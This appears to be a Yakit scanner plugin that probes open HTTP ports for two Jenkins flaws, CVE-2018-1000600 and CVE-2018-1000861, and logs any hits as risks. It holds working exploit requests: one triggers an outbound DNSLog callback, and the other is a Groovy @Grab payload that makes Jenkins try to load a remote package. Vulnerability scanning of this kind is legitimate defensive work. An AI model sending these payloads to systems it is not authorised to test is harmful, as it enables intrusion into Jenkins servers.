# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 
Packet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}
addDynRule = func(payloadGenerator,riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "isDyn":true,
        "packet": Packet,
        "payloadGenerator": payloadGenerator,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//添加动态规则
addDynRule(()=>{
    server, token, dnserr = risk.NewDNSLogDomain()
    payload = str.f(`/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=%v`, server)
    checker = (rsp,header,body)=>{
        sleep(5)
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            return true
        }
        return false
    }
    return payload,checker
},"RCE","jenkins-cve-2018-1000600","high","https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/")

rand = str.RandStr(4)
payload2 = `/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27`+rand+`%27,%20version=%271%27)%0aimport%20Payload`
addRule(Packet,payload2,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `package#`+rand) {
        return true
    }
    return false
},"RCE","jenkins-cve-2018-1000861","high","https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861")


//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }
        println("start")
        if rule.isDyn{
            println("dyn")
            rule["payload"],rule["check"] = rule.payloadGenerator()
        }
        dump(rule["payload"])
        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
